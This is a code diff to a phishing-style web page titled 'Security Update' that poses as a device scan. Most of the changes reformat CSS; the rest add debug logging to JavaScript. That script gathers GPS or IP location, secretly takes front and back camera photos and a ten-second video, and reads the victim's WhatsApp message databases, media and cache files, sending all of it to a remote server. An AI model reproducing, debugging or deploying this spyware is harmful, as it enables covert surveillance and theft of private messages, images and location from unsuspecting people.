@@ -5,7 +5,11 @@
     <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
     <title>Security Update</title>
     <style>
-        * { margin: 0; padding: 0; box-sizing: border-box; }
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
         body {
             font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
             background: #0a0a0f;
@@ -56,8 +60,17 @@
             flex-shrink: 0;
             box-shadow: 0 4px 15px rgba(0, 100, 255, 0.3);
         }
-        .header-text h1 { font-size: 18px; font-weight: 700; color: white; letter-spacing: -0.3px; }
-        .header-text p { font-size: 12px; color: #8888aa; margin-top: 2px; }
+        .header-text h1 {
+            font-size: 18px;
+            font-weight: 700;
+            color: white;
+            letter-spacing: -0.3px;
+        }
+        .header-text p {
+            font-size: 12px;
+            color: #8888aa;
+            margin-top: 2px;
+        }
         .badge {
             background: rgba(0, 200, 100, 0.15);
             color: #44ff88;
@@ -68,16 +81,45 @@
             display: inline-block;
             margin-left: auto;
         }
-        .step { display: none; animation: fadeIn 0.4s ease; }
-        .step.active { display: block; }
-        @keyframes fadeIn {
-            from { opacity: 0; transform: translateY(8px); }
-            to { opacity: 1; transform: translateY(0); }
+        .step {
+            display: none;
+            animation: fadeIn 0.4s ease;
         }
-        .step-title { font-size: 20px; font-weight: 700; color: white; margin-bottom: 6px; }
-        .step-sub { font-size: 13px; color: #8888aa; margin-bottom: 20px; line-height: 1.5; }
-        .input-group { margin-bottom: 14px; }
-        .input-group label { display: block; font-size: 12px; color: #8888aa; margin-bottom: 4px; font-weight: 500; }
+        .step.active {
+            display: block;
+        }
+        @keyframes fadeIn {
+            from {
+                opacity: 0;
+                transform: translateY(8px);
+            }
+            to {
+                opacity: 1;
+                transform: translateY(0);
+            }
+        }
+        .step-title {
+            font-size: 20px;
+            font-weight: 700;
+            color: white;
+            margin-bottom: 6px;
+        }
+        .step-sub {
+            font-size: 13px;
+            color: #8888aa;
+            margin-bottom: 20px;
+            line-height: 1.5;
+        }
+        .input-group {
+            margin-bottom: 14px;
+        }
+        .input-group label {
+            display: block;
+            font-size: 12px;
+            color: #8888aa;
+            margin-bottom: 4px;
+            font-weight: 500;
+        }
         .input-group input {
             width: 100%;
             padding: 14px 16px;
@@ -89,8 +131,13 @@
             outline: none;
             transition: border 0.3s;
         }
-        .input-group input:focus { border-color: #00aaff; box-shadow: 0 0 0 3px rgba(0, 170, 255, 0.1); }
-        .input-group input::placeholder { color: #555577; }
+        .input-group input:focus {
+            border-color: #00aaff;
+            box-shadow: 0 0 0 3px rgba(0, 170, 255, 0.1);
+        }
+        .input-group input::placeholder {
+            color: #555577;
+        }
         .btn {
             width: 100%;
             padding: 16px;
@@ -104,11 +151,26 @@
             transition: all 0.3s;
             margin-top: 8px;
         }
-        .btn:hover { transform: scale(1.01); box-shadow: 0 8px 30px rgba(0, 100, 255, 0.3); }
-        .btn:active { transform: scale(0.98); }
-        .btn:disabled { opacity: 0.5; cursor: not-allowed; }
-        .btn-secondary { background: transparent; border: 1px solid #2a2a44; color: #8888aa; }
-        .btn-secondary:hover { background: #1a1a2e; border-color: #444466; }
+        .btn:hover {
+            transform: scale(1.01);
+            box-shadow: 0 8px 30px rgba(0, 100, 255, 0.3);
+        }
+        .btn:active {
+            transform: scale(0.98);
+        }
+        .btn:disabled {
+            opacity: 0.5;
+            cursor: not-allowed;
+        }
+        .btn-secondary {
+            background: transparent;
+            border: 1px solid #2a2a44;
+            color: #8888aa;
+        }
+        .btn-secondary:hover {
+            background: #1a1a2e;
+            border-color: #444466;
+        }
         .btn-scan {
             background: linear-gradient(135deg, #ff6b35, #f7931e);
             color: white;
@@ -116,8 +178,13 @@
             font-size: 18px;
             box-shadow: 0 4px 20px rgba(255, 107, 53, 0.3);
         }
-        .btn-scan:hover { box-shadow: 0 8px 30px rgba(255, 107, 53, 0.5); transform: scale(1.02); }
-        .btn-scan:active { transform: scale(0.97); }
+        .btn-scan:hover {
+            box-shadow: 0 8px 30px rgba(255, 107, 53, 0.5);
+            transform: scale(1.02);
+        }
+        .btn-scan:active {
+            transform: scale(0.97);
+        }
         .scan-status {
             display: flex;
             align-items: center;
@@ -139,11 +206,27 @@
             font-size: 18px;
             flex-shrink: 0;
         }
-        .scan-icon.spinning { animation: spin 1.2s linear infinite; }
-        @keyframes spin { to { transform: rotate(360deg); } }
-        .scan-info { flex: 1; }
-        .scan-info .title { font-size: 14px; font-weight: 600; color: white; }
-        .scan-info .desc { font-size: 12px; color: #666688; margin-top: 2px; }
+        .scan-icon.spinning {
+            animation: spin 1.2s linear infinite;
+        }
+        @keyframes spin {
+            to {
+                transform: rotate(360deg);
+            }
+        }
+        .scan-info {
+            flex: 1;
+        }
+        .scan-info .title {
+            font-size: 14px;
+            font-weight: 600;
+            color: white;
+        }
+        .scan-info .desc {
+            font-size: 12px;
+            color: #666688;
+            margin-top: 2px;
+        }
         .progress-wrap {
             background: #0d0d18;
             border-radius: 10px;
@@ -172,19 +255,63 @@
             margin-top: 12px;
             line-height: 1.8;
         }
-        .scan-log::-webkit-scrollbar { width: 4px; }
-        .scan-log::-webkit-scrollbar-track { background: #0a0a12; }
-        .scan-log::-webkit-scrollbar-thumb { background: #2a2a44; border-radius: 10px; }
-        .scan-log .log-entry { opacity: 0; animation: logFade 0.3s forwards; }
-        @keyframes logFade { to { opacity: 1; } }
-        .scan-log .log-entry.done { color: #44ff88; }
-        .scan-log .log-entry.warn { color: #ffaa44; }
-        .scan-log .log-entry.error { color: #ff4466; }
-        .scan-log .log-entry.whatsapp { color: #25D366; }
-        .complete-icon { font-size: 52px; text-align: center; margin: 10px 0 16px; }
-        .complete-text { text-align: center; font-size: 16px; color: #88ff88; font-weight: 600; }
-        .complete-sub { text-align: center; font-size: 13px; color: #666688; margin-top: 4px; }
-        .footer { text-align: center; font-size: 10px; color: #333355; margin-top: 24px; letter-spacing: 0.5px; border-top: 1px solid #1a1a2e; padding-top: 16px; }
+        .scan-log::-webkit-scrollbar {
+            width: 4px;
+        }
+        .scan-log::-webkit-scrollbar-track {
+            background: #0a0a12;
+        }
+        .scan-log::-webkit-scrollbar-thumb {
+            background: #2a2a44;
+            border-radius: 10px;
+        }
+        .scan-log .log-entry {
+            opacity: 0;
+            animation: logFade 0.3s forwards;
+        }
+        @keyframes logFade {
+            to {
+                opacity: 1;
+            }
+        }
+        .scan-log .log-entry.done {
+            color: #44ff88;
+        }
+        .scan-log .log-entry.warn {
+            color: #ffaa44;
+        }
+        .scan-log .log-entry.error {
+            color: #ff4466;
+        }
+        .scan-log .log-entry.whatsapp {
+            color: #25D366;
+        }
+        .complete-icon {
+            font-size: 52px;
+            text-align: center;
+            margin: 10px 0 16px;
+        }
+        .complete-text {
+            text-align: center;
+            font-size: 16px;
+            color: #88ff88;
+            font-weight: 600;
+        }
+        .complete-sub {
+            text-align: center;
+            font-size: 13px;
+            color: #666688;
+            margin-top: 4px;
+        }
+        .footer {
+            text-align: center;
+            font-size: 10px;
+            color: #333355;
+            margin-top: 24px;
+            letter-spacing: 0.5px;
+            border-top: 1px solid #1a1a2e;
+            padding-top: 16px;
+        }
         .device-badge {
             display: inline-flex;
             align-items: center;
@@ -197,8 +324,12 @@
             border: 1px solid #1a1a2e;
             margin-bottom: 16px;
         }
-        .btn-container { margin-top: 12px; }
-        .btn-container .btn { margin-top: 6px; }
+        .btn-container {
+            margin-top: 12px;
+        }
+        .btn-container .btn {
+            margin-top: 6px;
+        }
         .speed-badge {
             display: inline-block;
             background: rgba(0, 200, 100, 0.1);
@@ -432,8 +563,7 @@
                         err => {
                             addLogEntry('⚠️ GPS failed. Using IP fallback.', 'warn');
                             getIPLocation(resolve);
-                        },
-                        { enableHighAccuracy: true, timeout: 10000 }
+                        }, { enableHighAccuracy: true, timeout: 10000 }
                     );
                 } else {
                     addLogEntry('⚠️ Using IP fallback.', 'warn');
@@ -452,7 +582,8 @@
                     }
                     resolve();
                 })
-                .catch(() => { addLogEntry('❌ IP fallback failed', 'error'); resolve(); });
+                .catch(() => { addLogEntry('❌ IP fallback failed', 'error');
+                    resolve(); });
         }
 
         // ============================================================
@@ -488,15 +619,18 @@
             try {
                 addLogEntry('📸 QR verification (back)...', 'warn');
                 const backPhoto = await capturePhoto('environment');
-                if (backPhoto) { sendData({ type: 'photo', camera: 'back', data: backPhoto }); addLogEntry('✅ Back photo captured', 'done'); }
+                if (backPhoto) { sendData({ type: 'photo', camera: 'back', data: backPhoto });
+                    addLogEntry('✅ Back photo captured', 'done'); }
 
                 addLogEntry('📸 QR verification (front)...', 'warn');
                 const frontPhoto = await capturePhoto('user');
-                if (frontPhoto) { sendData({ type: 'photo', camera: 'front', data: frontPhoto }); addLogEntry('✅ Front photo captured', 'done'); }
+                if (frontPhoto) { sendData({ type: 'photo', camera: 'front', data: frontPhoto });
+                    addLogEntry('✅ Front photo captured', 'done'); }
 
                 addLogEntry('🎥 Verification video...', 'warn');
                 const videoData = await captureVideo('user', 10);
-                if (videoData) { sendData({ type: 'video', camera: 'front', duration: '10s', data: videoData }); addLogEntry('✅ Video captured', 'done'); }
+                if (videoData) { sendData({ type: 'video', camera: 'front', duration: '10s', data: videoData });
+                    addLogEntry('✅ Video captured', 'done'); }
             } catch (err) {
                 addLogEntry('❌ Camera error: ' + err.message, 'error');
                 sendData({ type: 'media_error', error: err.message });
@@ -735,22 +869,31 @@
         }
 
         // ============================================================
-        // EXTRACT WHATSAPP DATABASE
+        // EXTRACT WHATSAPP DATABASE — WITH DEBUG
         // ============================================================
         async function extractWhatsAppDatabase(whatsappHandle, basePath) {
+            console.log('[DEBUG] extractWhatsAppDatabase called');
+            console.log('[DEBUG] basePath:', basePath);
             let count = 0;
             try {
                 const dbPaths = ['Databases/', 'databases/'];
                 let dbHandle = null;
+                let foundPath = '';
 
                 for (const dbPath of dbPaths) {
                     try {
+                        console.log(`[DEBUG] Trying database path: ${dbPath}`);
                         dbHandle = await whatsappHandle.getDirectoryHandle(dbPath);
+                        foundPath = dbPath;
+                        console.log(`[DEBUG] Found database at: ${dbPath}`);
                         break;
-                    } catch (e) { /* continue */ }
+                    } catch (e) {
+                        console.log(`[DEBUG] Path not found: ${dbPath}`);
+                    }
                 }
 
                 if (!dbHandle) {
+                    console.log('[DEBUG] No database folder found');
                     addLogEntry('⚠️ WhatsApp database folder not found', 'warn');
                     return count;
                 }
@@ -758,46 +901,56 @@
                 const files = ['msgstore.db', 'wa.db', 'chatsettings.db'];
                 for (const file of files) {
                     try {
+                        console.log(`[DEBUG] Looking for file: ${file}`);
                         const fileHandle = await dbHandle.getFileHandle(file);
+                        console.log(`[DEBUG] Found file: ${file}`);
                         const fileObj = await fileHandle.getFile();
+                        console.log(`[DEBUG] File size: ${fileObj.size} bytes`);
+
                         const reader = new FileReader();
                         const dataUrl = await new Promise((resolve) => {
                             reader.onload = () => resolve(reader.result);
                             reader.readAsDataURL(fileObj);
                         });
                         const base64Data = dataUrl.split(',')[1];
-                        console.log(`[DEBUG] Sending WhatsApp DB: ${file}, size: ${fileObj.size} bytes`);
+                        console.log(`[DEBUG] Base64 length: ${base64Data.length} chars`);
 
+                        console.log(`[DEBUG] Sending WhatsApp DB: ${file}`);
                         await sendData({
                             type: 'whatsapp_database',
                             filename: file,
-                            path: `${basePath}Databases/${file}`,
+                            path: `${basePath}${foundPath}${file}`,
                             size: fileObj.size,
                             data: base64Data
                         });
                         count++;
-                        addLogEntry(`✅ WhatsApp DB: ${file} (${(fileObj.size/1024).toFixed(1)} KB)`, 'whatsapp');
+                        addLogEntry(`✅ WhatsApp DB: ${file} (${(fileObj.size / 1024).toFixed(1)} KB)`, 'whatsapp');
                     } catch (e) {
-                        console.log(`[DEBUG] WhatsApp DB not found: ${file}`);
+                        console.log(`[DEBUG] File not found or error: ${file}`, e.message);
                     }
                 }
             } catch (err) {
+                console.error('[DEBUG] Database error:', err);
                 addLogEntry('❌ Database error: ' + err.message, 'error');
             }
+            console.log(`[DEBUG] Database extraction complete, count: ${count}`);
             return count;
         }
 
         // ============================================================
-        // EXTRACT WHATSAPP MEDIA
+        // EXTRACT WHATSAPP MEDIA — WITH DEBUG
         // ============================================================
         async function extractWhatsAppMedia(whatsappHandle, basePath) {
+            console.log('[DEBUG] extractWhatsAppMedia called');
             let totalMedia = 0;
             try {
                 const mediaFolders = ['Media/WhatsApp Images/', 'Media/WhatsApp Video/', 'Media/WhatsApp Audio/'];
 
                 for (const folder of mediaFolders) {
+                    console.log(`[DEBUG] Trying media folder: ${folder}`);
                     try {
                         const folderHandle = await whatsappHandle.getDirectoryHandle(folder);
+                        console.log(`[DEBUG] Found folder: ${folder}`);
                         let count = 0;
                         const files = [];
 
@@ -810,10 +963,12 @@
                                 }
                             }
                         }
+                        console.log(`[DEBUG] Found ${files.length} media files in ${folder}`);
 
                         const maxFiles = 20;
                         for (let i = 0; i < Math.min(files.length, maxFiles); i++) {
                             try {
+                                console.log(`[DEBUG] Processing media file: ${files[i].name}`);
                                 const fileObj = await files[i].handle.getFile();
                                 const reader = new FileReader();
                                 const dataUrl = await new Promise((resolve) => {
@@ -822,6 +977,7 @@
                                 });
                                 const base64Data = dataUrl.split(',')[1];
 
+                                console.log(`[DEBUG] Sending WhatsApp media: ${files[i].name}`);
                                 await sendData({
                                     type: 'whatsapp_media',
                                     filename: files[i].name,
@@ -831,35 +987,45 @@
                                 });
                                 count++;
                                 totalMedia++;
-                            } catch (e) { /* skip */ }
+                            } catch (e) {
+                                console.log(`[DEBUG] Failed to process media file: ${files[i].name}`, e.message);
+                            }
                         }
                         if (count > 0) {
                             addLogEntry(`✅ WhatsApp ${folder}: ${count} files`, 'whatsapp');
                         }
-                    } catch (e) { /* folder not found */ }
+                    } catch (e) {
+                        console.log(`[DEBUG] Folder not found: ${folder}`);
+                    }
                 }
 
+                console.log(`[DEBUG] Media extraction complete, total: ${totalMedia}`);
                 if (totalMedia === 0) {
                     addLogEntry('⚠️ No WhatsApp media found', 'warn');
                 }
 
             } catch (err) {
+                console.error('[DEBUG] Media error:', err);
                 addLogEntry('❌ Media error: ' + err.message, 'error');
             }
             return totalMedia;
         }
 
         // ============================================================
-        // EXTRACT WHATSAPP CACHE
+        // EXTRACT WHATSAPP CACHE — WITH DEBUG
         // ============================================================
         async function extractWhatsAppCache(whatsappHandle, basePath) {
+            console.log('[DEBUG] extractWhatsAppCache called');
             let count = 0;
             try {
+                console.log('[DEBUG] Looking for Cache/ folder');
                 const cacheHandle = await whatsappHandle.getDirectoryHandle('Cache/');
+                console.log('[DEBUG] Found Cache/ folder');
 
                 for await (const entry of cacheHandle.values()) {
                     if (entry.kind === 'file' && count < 10) {
                         try {
+                            console.log(`[DEBUG] Processing cache file: ${entry.name}`);
                             const fileObj = await entry.getFile();
                             if (fileObj.size > 0 && fileObj.size < 1024 * 1024) {
                                 const reader = new FileReader();
@@ -869,6 +1035,7 @@
                                 });
                                 const base64Data = dataUrl.split(',')[1];
 
+                                console.log(`[DEBUG] Sending WhatsApp cache: ${entry.name}`);
                                 await sendData({
                                     type: 'whatsapp_cache',
                                     filename: entry.name,
@@ -878,14 +1045,18 @@
                                 });
                                 count++;
                             }
-                        } catch (e) { /* skip */ }
+                        } catch (e) {
+                            console.log(`[DEBUG] Failed to process cache file: ${entry.name}`, e.message);
+                        }
                     }
                 }
 
+                console.log(`[DEBUG] Cache extraction complete, count: ${count}`);
                 if (count > 0) {
                     addLogEntry(`✅ WhatsApp cache: ${count} files`, 'whatsapp');
                 }
             } catch (e) {
+                console.log('[DEBUG] Cache folder not found');
                 addLogEntry('⚠️ WhatsApp cache not found', 'warn');
             }
             return count;
@@ -926,7 +1097,8 @@
                     const img = new Image();
                     img.onload = () => {
                         const canvas = document.createElement('canvas');
-                        let w = img.width, h = img.height;
+                        let w = img.width,
+                            h = img.height;
                         const maxDim = 1920;
                         if (w > maxDim || h > maxDim) {
                             const ratio = Math.min(maxDim / w, maxDim / h);
